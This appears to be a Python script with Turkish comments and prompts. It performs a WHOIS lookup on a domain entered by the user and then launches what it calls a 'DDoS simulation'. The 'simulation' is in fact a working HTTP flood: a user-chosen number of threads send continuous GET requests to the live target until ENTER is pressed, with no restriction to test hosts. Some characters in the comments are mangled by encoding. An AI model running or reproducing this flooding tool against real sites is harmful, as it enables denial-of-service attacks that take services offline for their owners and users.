import whois
import threading
import requests

# Global de�i�ken sald�r�y� durdurmak i�in
ddos_running = True

def whois_sorgusu(domain_name):
    """Whois sorgusu yapar ve bilgileri ekrana yazar."""
    try:
        domain_info = whois.whois(domain_name)
        print("\nWhois Bilgileri:")
        print("-----------------")
        print("Domain Adi:", domain_info.domain_name)
        print("Kayitci:", domain_info.registrar)
        print("Olusturulma Tarihi:", domain_info.creation_date)
        print("Bitis Tarihi:", domain_info.expiration_date)
        print("Isim Sunuculari:", domain_info.name_servers)
        print("Durum:", domain_info.status)
    except Exception as e:
        print(f"Whois sorgusu basarisiz: {e}")

def ddos_saldirisi(target_url, thread_count):
    """DDoS sald�r�s�n� sim�le eder."""
    def istek_gonder():
        global ddos_running
        try:
            while ddos_running:
                response = requests.get(target_url)
                print(f"HTTP Durum Kodu: {response.status_code}")
        except Exception as e:
            print(f"Hata: {e}")
    
    # Kullan�c�dan durdurma sinyali i�in bir thread ba�lat
    def durdurma_mechanizmasi():
        global ddos_running
        input("\nDDoS sald�r�s�n� durdurmak i�in ENTER'a bas�n...\n")
        ddos_running = False

    # Threadler ba�lat�l�yor
    threads = []

    # Durdurma thread'i
    durdurma_thread = threading.Thread(target=durdurma_mechanizmasi)
    threads.append(durdurma_thread)
    durdurma_thread.start()

    # �stek g�nderme thread'leri
    for i in range(thread_count):
        thread = threading.Thread(target=istek_gonder)
        threads.append(thread)
        thread.start()

    # T�m thread'lerin tamamlanmas�n� bekle
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print("=== Whois ve DDoS Simulasyonu ===")
    domain = input("Lutfen bir domain adi giriniz (ornek: example.com): ")

    # Whois sorgusu yap
    whois_sorgusu(domain)

    # Kullaniciya DDoS yapmak isteyip istemedigini sor
    secim = input("\nBu domain icin DDoS/DOS simulasyonu yapmak istiyor musunuz? (Evet/Hayir): ").strip().lower()
    if secim in ["evet", "e", "yes", "y"]:
        hedef_url = f"http://{domain}"
        try:
            thread_count = int(input("Kac is parcacigi calistirmak istiyorsunuz? (Ornek: 10-50): "))
            print(f"{hedef_url} adresine DDoS simulasyonu baslatiliyor...")
            ddos_saldirisi(hedef_url, thread_count)
        except Exception as e:
            print(f"Hata: {e}")
    else:
        print("DDoS simulasyonu iptal edildi.")
